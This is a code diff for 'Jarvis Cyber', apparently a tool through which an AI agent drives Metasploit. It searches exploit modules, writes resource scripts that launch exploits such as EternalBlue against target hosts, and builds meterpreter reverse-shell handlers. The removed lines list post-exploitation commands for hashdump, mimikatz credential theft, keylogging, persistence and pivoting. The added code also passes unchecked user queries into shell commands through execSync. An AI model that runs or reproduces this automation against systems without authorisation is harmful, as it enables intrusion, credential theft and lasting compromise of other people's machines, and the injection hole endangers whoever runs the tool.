@@ -1,18 +1,22 @@
-// Jarvis Cyber — Metasploit RPC Interface
+// Jarvis Cyber — Dynamic Metasploit Interface (uses msfconsole)
+// No hardcoded module database — uses real msfconsole search for module discovery
+import { execSync } from 'child_process';
+import { toolInstaller } from '../tool-installer.js';
+
 export const definition = {
   type: 'function',
   function: {
     name: 'metasploit_rpc',
-    description: 'Interface with Metasploit Framework via msfrpcd or msfconsole commands. Generate resource scripts, search for modules, and build exploit/payload configurations. If msfrpcd is not running, generates ready-to-use msfconsole resource scripts (.rc files).',
+    description: 'Interface with Metasploit Framework via msfconsole. Search modules dynamically, generate resource scripts, and build exploit/payload configurations. Uses real msfconsole search — no hardcoded module database.',
     parameters: {
       type: 'object',
       properties: {
         action: {
           type: 'string',
-          enum: ['search', 'generate_rc', 'exploit_config', 'post_exploit', 'handler'],
-          description: 'Action: search modules, generate .rc file, configure exploit, generate post-exploitation script, or create handler'
+          enum: ['search', 'generate_rc', 'exploit_config', 'post_exploit', 'handler', 'info'],
+          description: 'Action: search modules, generate .rc file, configure exploit, post-exploitation, create handler, or get module info',
         },
-        query: { type: 'string', description: 'Search query or exploit module path (e.g., "exploit/multi/handler", "eternalblue")' },
+        query: { type: 'string', description: 'Search query or exploit module path (e.g., "exploit/multi/handler", "eternalblue", "type:exploit platform:windows smb")' },
         rhosts: { type: 'string', description: 'Target IP/range' },
         lhost: { type: 'string', description: 'Local/listener IP' },
         lport: { type: 'integer', description: 'Local port (default: 4444)' },
@@ -26,61 +30,109 @@ export const definition = {
 
 export async function execute(args) {
   const { action, query, rhosts, lhost = '0.0.0.0', lport = 4444, payload, options } = args;
-  
+
   switch (action) {
     case 'search':
       return _searchModules(query);
     case 'generate_rc':
       return _generateRC(query, rhosts, lhost, lport, payload, options);
     case 'exploit_config':
-      return _exploitConfig(query, rhosts, lhost, lport, payload, options);
+      return _generateRC(query, rhosts, lhost, lport, payload, options);
     case 'post_exploit':
       return _postExploit(query);
     case 'handler':
       return _generateHandler(lhost, lport, payload);
+    case 'info':
+      return _moduleInfo(query);
     default:
       return { success: false, error: `Unknown action: ${action}` };
   }
 }
 
 function _searchModules(query) {
-  // Common exploit modules reference database
-  const modules = {
-    'eternalblue': { path: 'exploit/windows/smb/ms17_010_eternalblue', description: 'MS17-010 EternalBlue SMB RCE', os: 'Windows 7/2008 R2', payload: 'windows/x64/meterpreter/reverse_tcp' },
-    'bluekeep': { path: 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce', description: 'CVE-2019-0708 BlueKeep RDP RCE', os: 'Windows 7/2008 R2', payload: 'windows/x64/meterpreter/reverse_tcp' },
-    'log4shell': { path: 'exploit/multi/http/log4shell_header_injection', description: 'CVE-2021-44228 Log4j RCE', os: 'Any Java', payload: 'java/meterpreter/reverse_tcp' },
-    'shellshock': { path: 'exploit/multi/http/apache_mod_cgi_bash_env_exec', description: 'CVE-2014-6271 Bash ShellShock', os: 'Linux', payload: 'linux/x86/meterpreter/reverse_tcp' },
-    'struts': { path: 'exploit/multi/http/struts2_content_type_ognl', description: 'Apache Struts 2 RCE', os: 'Any Java', payload: 'linux/x86/meterpreter/reverse_tcp' },
-    'drupalgeddon': { path: 'exploit/unix/webapp/drupal_drupalgeddon2', description: 'Drupalgeddon2 RCE (CVE-2018-7600)', os: 'Linux', payload: 'php/meterpreter/reverse_tcp' },
-    'tomcat': { path: 'exploit/multi/http/tomcat_mgr_upload', description: 'Tomcat Manager Upload WAR', os: 'Any Java', payload: 'java/meterpreter/reverse_tcp' },
-    'jenkins': { path: 'exploit/multi/http/jenkins_script_console', description: 'Jenkins Script Console RCE', os: 'Any Java', payload: 'java/meterpreter/reverse_tcp' },
-    'psexec': { path: 'exploit/windows/smb/psexec', description: 'PsExec via SMB', os: 'Windows', payload: 'windows/meterpreter/reverse_tcp' },
-    'vsftpd': { path: 'exploit/unix/ftp/vsftpd_234_backdoor', description: 'vsftpd 2.3.4 Backdoor', os: 'Linux', payload: 'cmd/unix/interact' },
-    'heartbleed': { path: 'auxiliary/scanner/ssl/openssl_heartbleed', description: 'OpenSSL Heartbleed Memory Leak', os: 'Any', payload: null },
-    'smb_relay': { path: 'exploit/windows/smb/smb_relay', description: 'SMB Relay Attack', os: 'Windows', payload: 'windows/meterpreter/reverse_tcp' },
-    'printnightmare': { path: 'exploit/windows/dcerpc/cve_2021_1675_printnightmare', description: 'PrintNightmare RCE', os: 'Windows', payload: 'windows/x64/meterpreter/reverse_tcp' },
-    'proxyshell': { path: 'exploit/windows/http/exchange_proxyshell_rce', description: 'Exchange ProxyShell RCE', os: 'Windows', payload: 'windows/x64/meterpreter/reverse_tcp' },
-    'zerologon': { path: 'exploit/windows/dcerpc/cve_2020_1472_zerologon', description: 'Zerologon Netlogon Bypass', os: 'Windows AD', payload: null },
-  };
-
   if (!query) {
-    return { success: true, modules: Object.entries(modules).map(([k, v]) => ({ keyword: k, ...v })) };
+    return { success: false, error: 'Search query required. Examples: "eternalblue", "type:exploit platform:windows smb", "cve:2021-44228"' };
   }
 
-  const matches = Object.entries(modules)
-    .filter(([k, v]) => k.includes(query.toLowerCase()) || v.path.includes(query.toLowerCase()) || v.description.toLowerCase().includes(query.toLowerCase()))
-    .map(([k, v]) => ({ keyword: k, ...v }));
+  // Use real msfconsole search if available
+  if (_isInstalled('msfconsole')) {
+    try {
+      const cmd = `msfconsole -q -x "search ${query}; exit" 2>/dev/null | grep -E "^\\s+\\d+|exploit/|auxiliary/|post/" | head -30`;
+      const output = execSync(cmd, {
+        encoding: 'utf8',
+        timeout: 60000,
+        env: { ...process.env, TERM: 'dumb' },
+      });
 
+      const modules = _parseMsfSearchOutput(output);
+      return {
+        success: true,
+        query,
+        tool_used: 'msfconsole',
+        results_count: modules.length,
+        results: modules,
+        note: modules.length > 0
+          ? 'Use generate_rc action with the module path to create a resource script.'
+          : 'No modules found. Try broader search terms.',
+      };
+    } catch {}
+  }
+
+  // Fallback: return msfconsole search command for the AI to run
   return {
     success: true,
     query,
-    results: matches,
-    note: matches.length > 0 ? 'Use generate_rc action with the module path to create a ready-to-use Metasploit resource script.' : 'No matches. Try broader terms.'
+    tool_used: 'command_template',
+    note: 'msfconsole not available. Use execute_command to run:',
+    command: `msfconsole -q -x "search ${query}; exit"`,
+    install_hint: 'Install Metasploit: install_tool("metasploit-framework")',
   };
 }
 
+function _moduleInfo(query) {
+  if (!query) return { success: false, error: 'Module path required' };
+
+  if (_isInstalled('msfconsole')) {
+    try {
+      const cmd = `msfconsole -q -x "info ${query}; exit" 2>/dev/null | head -60`;
+      const output = execSync(cmd, {
+        encoding: 'utf8',
+        timeout: 30000,
+        env: { ...process.env, TERM: 'dumb' },
+      });
+      return { success: true, module: query, info: output.slice(0, 3000) };
+    } catch {}
+  }
+
+  return {
+    success: true,
+    module: query,
+    command: `msfconsole -q -x "info ${query}; exit"`,
+    note: 'Run this command with execute_command to get module details.',
+  };
+}
+
+function _parseMsfSearchOutput(output) {
+  const modules = [];
+  const lines = output.split('\n');
+
+  for (const line of lines) {
+    // Match: "  0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  excellent  MS17-010 EternalBlue"
+    const match = line.match(/\s*\d+\s+((?:exploit|auxiliary|post|payload|encoder|nop)\/\S+)\s+(\S+)\s+(\w+)\s+(.*)/);
+    if (match) {
+      modules.push({
+        path: match[1],
+        date: match[2],
+        rank: match[3],
+        description: match[4].trim(),
+      });
+    }
+  }
+  return modules;
+}
+
 function _generateRC(module, rhosts, lhost, lport, payload, options) {
-  if (!module) return { success: false, error: 'module path required' };
+  if (!module) return { success: false, error: 'module path required (e.g., "exploit/windows/smb/ms17_010_eternalblue")' };
 
   let rc = `# Jarvis Auto-Generated Metasploit Resource Script\n`;
   rc += `# Generated: ${new Date().toISOString()}\n\n`;
@@ -89,7 +141,7 @@ function _generateRC(module, rhosts, lhost, lport, payload, options) {
   if (lhost) rc += `set LHOST ${lhost}\n`;
   if (lport) rc += `set LPORT ${lport}\n`;
   if (payload) rc += `set PAYLOAD ${payload}\n`;
-  
+
   if (options) {
     for (const opt of options.split(',')) {
       const [key, value] = opt.split('=').map(s => s.trim());
@@ -104,42 +156,45 @@ function _generateRC(module, rhosts, lhost, lport, payload, options) {
     success: true,
     rc_script: rc,
     run_command: `msfconsole -r exploit.rc`,
-    note: 'Save this as exploit.rc and run with the command above. Or use execute_command to write and run it.'
+    note: 'Save this as exploit.rc and run with the command above. Or use execute_command to write and run it.',
   };
-}
-
-function _exploitConfig(module, rhosts, lhost, lport, payload, options) {
-  return _generateRC(module, rhosts, lhost, lport, payload, options);
 }
 
 function _postExploit(query) {
-  const postModules = {
-    'hashdump': 'run post/windows/gather/hashdump',
-    'mimikatz': 'load kiwi\ncreds_all',
-    'keylogger': 'keyscan_start\n# Wait then: keyscan_dump',
-    'screenshot': 'screenshot',
-    'persistence': 'run persistence -U -i 5 -p 4444 -r LHOST',
-    'pivot': 'run autoroute -s TARGET_SUBNET/24\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun',
-    'escalate': 'use post/multi/recon/local_exploit_suggester\nset SESSION 1\nrun',
-    'enum': 'sysinfo\ngetuid\nrun post/windows/gather/enum_logged_on_users\nrun post/multi/gather/env',
-    'dump_creds': 'run post/windows/gather/credentials/credential_collector',
-    'network': 'run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24',
-    'portscan': 'run post/multi/gather/multi_command RESOURCE=/tmp/cmds.txt',
-  };
-
   if (!query) {
-    return { success: true, available: Object.keys(postModules), note: 'Specify a query to get the post-exploitation commands.' };
+    return {
+      success: true,
+      note: 'Specify a post-exploitation task. The AI should use msfconsole search or execute_command to find appropriate post modules.',
+      hint: 'Common tasks: hashdump, mimikatz, persistence, pivot, escalate, enum. Use: msfconsole -q -x "search type:post <query>; exit"',
+    };
   }
 
-  const matches = Object.entries(postModules)
-    .filter(([k]) => k.includes(query.toLowerCase()))
-    .map(([k, v]) => ({ name: k, commands: v }));
+  // Use real msfconsole search for post modules
+  if (_isInstalled('msfconsole')) {
+    try {
+      const cmd = `msfconsole -q -x "search type:post ${query}; exit" 2>/dev/null | head -20`;
+      const output = execSync(cmd, { encoding: 'utf8', timeout: 30000, env: { ...process.env, TERM: 'dumb' } });
+      const modules = _parseMsfSearchOutput(output);
+      return { success: true, query, results: modules };
+    } catch {}
+  }
 
-  return { success: true, query, results: matches.length > 0 ? matches : [{ note: 'No match. Available: ' + Object.keys(postModules).join(', ') }] };
+  return {
+    success: true, query,
+    command: `msfconsole -q -x "search type:post ${query}; exit"`,
+    note: 'Run this command to find post-exploitation modules.',
+  };
 }
 
 function _generateHandler(lhost, lport, payload) {
   const p = payload || 'windows/meterpreter/reverse_tcp';
   const rc = `use exploit/multi/handler\nset PAYLOAD ${p}\nset LHOST ${lhost}\nset LPORT ${lport}\nset ExitOnSession false\nexploit -j\n`;
   return { success: true, handler_rc: rc, run_command: 'msfconsole -r handler.rc' };
+}
+
+function _isInstalled(tool) {
+  try {
+    execSync(`command -v ${tool}`, { stdio: 'ignore', timeout: 3000 });
+    return true;
+  } catch { return false; }
 }
